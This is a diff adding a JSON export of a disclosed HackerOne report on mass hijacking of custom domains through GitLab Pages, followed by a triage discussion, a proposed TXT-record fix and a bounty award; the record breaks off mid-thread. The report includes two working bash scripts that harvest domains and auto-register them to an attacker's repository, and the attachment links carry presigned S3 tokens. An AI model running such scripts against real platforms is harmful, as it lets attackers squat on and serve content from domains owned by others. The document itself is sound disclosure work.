@@ -1,0 +1,719 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "jokebookservice1", 
+        "sp1d3rs", 
+        "bl4de", 
+        "europa", 
+        "ramsexy", 
+        "003random", 
+        "bogdantcaciuc", 
+        "glc", 
+        "emitrani", 
+        "muon4", 
+        "and 23 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "750.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 312118, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-02-21T23:46:09.382Z", 
+    "vulnerability_information": "# Vulnerability Description\n\nThere is a logic flaw in how GitLab pages can set custom domains that allows an attacker to actively monitor domains and hijack them as soon as they point to `52.167.214.135`. GitLab allows setting an unlimited number of domains for a single repository. \n\nFirst, I wrote a fully-fledged exploit that hijacks unclaimed domains. In under 5s I managed to secure 110 domains.\n\n```bash\n#!/bin/bash\n\nsearches=(\n    \"The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it.\"\n)\n\ngron \"https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135\" | fgrep \"domain\" | grep -o '\"[^\"]\\+\"' | cut -d '\"' -f 2 > whiteknight-temp\n\nwhile read domain; do\n    if host \"$domain\"> /dev/null; then\n        echo $domain;\n    fi;\ndone < whiteknight-temp >> domains\n\ncat domains | uniq | sed -e 's/^/https:\\/\\//' >> domains-to-test\n\nmeg / domains-to-test\n\nfor str in \"${searches[@]}\"; do\n    grep --color -Hnri \"$str\" out/\ndone\n\nwhile read target; do\n    curl --silent 'https://gitlab.com/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data \"utf8=\u2713&authenticity_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]\"\ndone < domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n```\n\nThen I modified the script to gather any domain and add it to my repository. This means that as soon as someone points their domain to `52.167.214.135`, my repository will hijack their domain, and serve content on that domain. This prevents the user from even creating a repository on GitLab with that domain.\n\n```bash\n#!/bin/bash\n\nIPS=(\n    # GitLab\n    \"52.167.214.135\"\n    # GitHub\n    \"192.30.252.153\"\n    \"192.30.252.154\"\n    # Shopify\n    \"23.227.38.32\"\n)\n\nfor ip in \"${IPS[@]}\"; do\n    gron \"https://app.securitytrails.com/api/search/by_type/ip/$ip\" | fgrep \"domain\" | grep -o '\"[^\"]\\+\"' | cut -d '\"' -f 2 > whiteknight-temp\ndone\n\nwhile read domain; do\n    if host \"$domain\"> /dev/null; then\n        echo $domain;\n    fi;\ndone < whiteknight-temp >> domains\n\nwhile read target; do\n    curl --silent 'https://gitlab.com/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data \"utf8=\u2713&authenticity_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]\"\ndone < domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n```\n\nPlease note that you could just extract a bunch of domains from the Alexa or randomly from the web, I just use `securitytrails.com` to demonstrate the issue without affecting your users.\n\n# Proof of concept\n\nWith my colleague's permission, I asked them to set an A record for their personal domain (http://danfield.photography/) pointing to `52.167.214.135`. They set the A record **after** I had added their domain to my repository. After a couple of minutes, their domain was serving my repository's content.\n\n# Mitigation\n\nSince this is a logic flaw, there will be multiple ways to mitigate the issue.\n\n1. You could restrict repositories to only a single custom domain \u2014 this is what GitHub does.\n2. Require users to place a randomly generated string as a TXT record on their domain when confirming ownership of the domain.\n3. Not store the domain until it actually points to `52.167.214.135` \u2014 currently you store any domain pointing to various other services and IPs.\n\n## Impact\n\nGitLab allows unrestricted mass-scale monitoring and claiming of domains. This attack can be performed in mere seconds.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "Team"
+    }, 
+    "title": "Using GitLab to monitor and hijack domains in mass quantity.", 
+    "is_member_of_team?": null, 
+    "vote_count": 33, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-03-23T23:46:09.454Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$750", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-05T21:47:53.899Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-05T21:47:53.899Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @edoverflow,\n\nThank you for submitting this report. I've marked this as a duplicate of https://hackerone.com/reports/296907. We've reconsidered the issue and are implementing a short-term fix as well as a domain verification mechanism. We will keep you updated on our progress via HackerOne.\n\nFeel free to contact us at anytime if you need an update\n\nBest regards,\nJames", 
+            "markdown_message": "<p>Hi <a href=\"/edoverflow\">@edoverflow</a>,</p>\n\n<p>Thank you for submitting this report. I&#39;ve marked this as a duplicate of <a title=\"https://hackerone.com/reports/296907\" href=\"https://hackerone.com/reports/296907\">https://hackerone.com/reports/296907</a>. We&#39;ve reconsidered the issue and are implementing a short-term fix as well as a domain verification mechanism. We will keep you updated on our progress via HackerOne.</p>\n\n<p>Feel free to contact us at anytime if you need an update</p>\n\n<p>Best regards,<br>\nJames</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2353590, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-05T21:49:27.091Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-05T21:49:27.091Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Duplicate of https://hackerone.com/reports/296907", 
+            "markdown_message": "<p>Duplicate of <a title=\"https://hackerone.com/reports/296907\" href=\"https://hackerone.com/reports/296907\">https://hackerone.com/reports/296907</a></p>\n", 
+            "type": "Activities::BugDuplicate", 
+            "id": 2353594, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-05T22:15:42.277Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-05T22:20:56.661Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @jritchey,\n\nWhile what I have demonstrated here might have a similar outcome as in #296907, this is in fact a different attack vector. #296907 is simply concerning unclaimed domains \u2014 as Brian pointed out, an issue caused by the user. My report on the other hand is a design flaw from your side \u2014 you allow setting an unlimited number of domains and on top of that, you allow users to squat domains that are not even pointing to `52.167.214.135` in the first place. I, hereby, kindly request you review this report again. There appears to be a misunderstanding \u2014 I would definitely not go out of my way to report a previously-disclosed report to you.", 
+            "markdown_message": "<p>Hi <a href=\"/jritchey\">@jritchey</a>,</p>\n\n<p>While what I have demonstrated here might have a similar outcome as in <a href=\"/reports/296907\">#296907</a>, this is in fact a different attack vector. <a href=\"/reports/296907\">#296907</a> is simply concerning unclaimed domains \u2014 as Brian pointed out, an issue caused by the user. My report on the other hand is a design flaw from your side \u2014 you allow setting an unlimited number of domains and on top of that, you allow users to squat domains that are not even pointing to <code>52.167.214.135</code> in the first place. I, hereby, kindly request you review this report again. There appears to be a misunderstanding \u2014 I would definitely not go out of my way to report a previously-disclosed report to you.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2353652, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T18:37:00.874Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T18:37:00.874Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "I really think that there was a grave misunderstanding here and I can assure you that this is not the same attack vector as #296907. Please do review this report again as I believe it would be a shame to end this report on this note.", 
+            "markdown_message": "<p>I really think that there was a grave misunderstanding here and I can assure you that this is not the same attack vector as <a href=\"/reports/296907\">#296907</a>. Please do review this report again as I believe it would be a shame to end this report on this note.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2359966, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T19:25:29.779Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T19:25:29.779Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "I'm investigating this further and will get back to you as soon as I can.", 
+            "markdown_message": "<p>I&#39;m investigating this further and will get back to you as soon as I can.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2360123, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T19:26:01.992Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T19:26:01.992Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Thank you, @jritchey.", 
+            "markdown_message": "<p>Thank you, <a href=\"/jritchey\">@jritchey</a>.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2360124, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T19:53:14.255Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T19:53:14.255Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "@edoverflow a question for you on your suggested mitigation approach... once the TXT record key is placed, will that address this issue that you are highlighting? Or would a re-verification mechanism also be needed?", 
+            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> a question for you on your suggested mitigation approach... once the TXT record key is placed, will that address this issue that you are highlighting? Or would a re-verification mechanism also be needed?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2360201, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/261/178/0e163d0559e478d9d73096e125269ef65bce4167/gitlab-proposed-fix.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222651Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cd21df8a044ba8eb27611fa607c6b0a0a660155e381ab6f882b8f58a45aa713a", 
+                    "type": "image/png", 
+                    "id": 261178, 
+                    "filename": "gitlab-proposed-fix.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-02-07T20:34:54.604Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T20:34:54.604Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @kathyw,\n\nTXT record validation when adding the custom domain should mitigate this issue. You generate the token when the user adds the domain.\n\n{F261178}", 
+            "markdown_message": "<p>Hi <a href=\"/kathyw\">@kathyw</a>,</p>\n\n<p>TXT record validation when adding the custom domain should mitigate this issue. You generate the token when the user adds the domain.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"gitlab-proposed-fix.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/261/178/0e163d0559e478d9d73096e125269ef65bce4167/gitlab-proposed-fix.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222651Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=cd21df8a044ba8eb27611fa607c6b0a0a660155e381ab6f882b8f58a45aa713a\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/261/178/0e163d0559e478d9d73096e125269ef65bce4167/gitlab-proposed-fix.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222651Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=cd21df8a044ba8eb27611fa607c6b0a0a660155e381ab6f882b8f58a45aa713a\" class=\"markdown-inline-image\"></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2360315, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-07T22:38:48.208Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-07T22:38:48.208Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @edoverflow ,\n\nI have a couple of questions and below is my understanding of the report.\n\n## Vulnerability vs exploit\n\nIsn't the real vulnerability that **GitLab doesn't validate the custom domain** when added?\n\nhttps://hackerone.com/reports/296907 exploits this vulnerability by claiming the domain when stale DNS A records **already** point to `52.167.214.135`. My understanding is that this report exploits this vulnerability by claiming the domain name **before** the DNS record has been added. To me, this report seems to be a different exploit of the same vulnerability.\n\nAlso, if the real issue is a lack of custom domain validation, why would allowing multiple domains be a vulnerability as long as are validated?\n", 
+            "markdown_message": "<p>Hi <a href=\"/edoverflow\">@edoverflow</a> ,</p>\n\n<p>I have a couple of questions and below is my understanding of the report.</p>\n\n<h2 id=\"vulnerability-vs-exploit\">Vulnerability vs exploit</h2>\n\n<p>Isn&#39;t the real vulnerability that <strong>GitLab doesn&#39;t validate the custom domain</strong> when added?</p>\n\n<p><a title=\"https://hackerone.com/reports/296907\" href=\"https://hackerone.com/reports/296907\">https://hackerone.com/reports/296907</a> exploits this vulnerability by claiming the domain when stale DNS A records <strong>already</strong> point to <code>52.167.214.135</code>. My understanding is that this report exploits this vulnerability by claiming the domain name <strong>before</strong> the DNS record has been added. To me, this report seems to be a different exploit of the same vulnerability.</p>\n\n<p>Also, if the real issue is a lack of custom domain validation, why would allowing multiple domains be a vulnerability as long as are validated?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2360597, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T10:05:01.447Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T10:05:01.447Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "> Isn't the real vulnerability that GitLab doesn't validate the custom domain when added?\n\nThat and the fact that you allow an unrestricted number of domains for a single repository, and that you allow users to add domains that are not pointing towards `52.167.214.135`.\n\n> To me, this report seems to be a different exploit of the same vulnerability.\n\nLet me break down the two reports and explain what is going on.\n\n**#296907** \n\nThis report is what we commonly refer to as a \"(sub)domain takeover\". This issue is quite prevalent, but normally you do not report the issue to the service the vendor is serving their content on, but rather the vendor themselves. See https://hackerone.com/reports/263902 where I reported 5 subdomain takeovers to the TTS where their subdomains were pointing to GitHub.\n\nThis type of issue is caused by the user and not the vendor, therefore I fully agree with Brian's conclusion. What surprised me about that report is the fact that you disclosed it without notifying affected users. In fact, I recreated the exploit and added a small trick where I check the apex domain and the `www.` subdomain to increase the pool of vulnerable users to 700.\n\n**#312118 (this report)**\n\nThis report is about squatting domains **before** they even point to GitLab, preventing the user from using their custom domain, and serving content on their domain. This issue is in fact caused by GitLab and **not** the user.\n\n1. You should not allow registering an unlimited number of (sub)domains for a single repository;\n2. You should not allow users to add domains that are not already pointing to `52.167.214.135`;\n3. You should validate the domain when a user adds the domain to their repository.\n\nAdmittedly, you might kill two birds with one stone when using my proposed fix, but that does not mean it is the same issue at all. My finding is more in-depth and therefore requires fixing #296907 in the process too.", 
+            "markdown_message": "<blockquote>\n<p>Isn&#39;t the real vulnerability that GitLab doesn&#39;t validate the custom domain when added?</p>\n</blockquote>\n\n<p>That and the fact that you allow an unrestricted number of domains for a single repository, and that you allow users to add domains that are not pointing towards <code>52.167.214.135</code>.</p>\n\n<blockquote>\n<p>To me, this report seems to be a different exploit of the same vulnerability.</p>\n</blockquote>\n\n<p>Let me break down the two reports and explain what is going on.</p>\n\n<p><strong>#296907</strong> </p>\n\n<p>This report is what we commonly refer to as a &quot;(sub)domain takeover&quot;. This issue is quite prevalent, but normally you do not report the issue to the service the vendor is serving their content on, but rather the vendor themselves. See <a title=\"https://hackerone.com/reports/263902\" href=\"https://hackerone.com/reports/263902\">https://hackerone.com/reports/263902</a> where I reported 5 subdomain takeovers to the TTS where their subdomains were pointing to GitHub.</p>\n\n<p>This type of issue is caused by the user and not the vendor, therefore I fully agree with Brian&#39;s conclusion. What surprised me about that report is the fact that you disclosed it without notifying affected users. In fact, I recreated the exploit and added a small trick where I check the apex domain and the <code>www.</code> subdomain to increase the pool of vulnerable users to 700.</p>\n\n<p><strong>#312118 (this report)</strong></p>\n\n<p>This report is about squatting domains <strong>before</strong> they even point to GitLab, preventing the user from using their custom domain, and serving content on their domain. This issue is in fact caused by GitLab and <strong>not</strong> the user.</p>\n\n<ol>\n<li>You should not allow registering an unlimited number of (sub)domains for a single repository;</li>\n<li>You should not allow users to add domains that are not already pointing to <code>52.167.214.135</code>;</li>\n<li>You should validate the domain when a user adds the domain to their repository.</li>\n</ol>\n\n<p>Admittedly, you might kill two birds with one stone when using my proposed fix, but that does not mean it is the same issue at all. My finding is more in-depth and therefore requires fixing <a href=\"/reports/296907\">#296907</a> in the process too.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2362081, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T17:49:39.520Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T17:49:39.520Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @edoverflow,\n\nThanks the detailed clarification. I'm awarding a High severity bounty for this report. Also, I'm referencing the notification on the GitLab blog https://about.gitlab.com/2018/02/05/gitlab-pages-custom-domain-validation/.\n\nBest,\nJames", 
+            "markdown_message": "<p>Hi <a href=\"/edoverflow\">@edoverflow</a>,</p>\n\n<p>Thanks the detailed clarification. I&#39;m awarding a High severity bounty for this report. Also, I&#39;m referencing the notification on the GitLab blog <a title=\"https://about.gitlab.com/2018/02/05/gitlab-pages-custom-domain-validation/\" href=\"/redirect?signature=21ea15d6302cce17c18c68b90ef27be83af7a2ca&amp;url=https%3A%2F%2Fabout.gitlab.com%2F2018%2F02%2F05%2Fgitlab-pages-custom-domain-validation%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://about.gitlab.com/2018/02/05/gitlab-pages-custom-domain-validation/</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>Best,<br>\nJames</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2363416, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T17:50:21.845Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T17:50:21.845Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
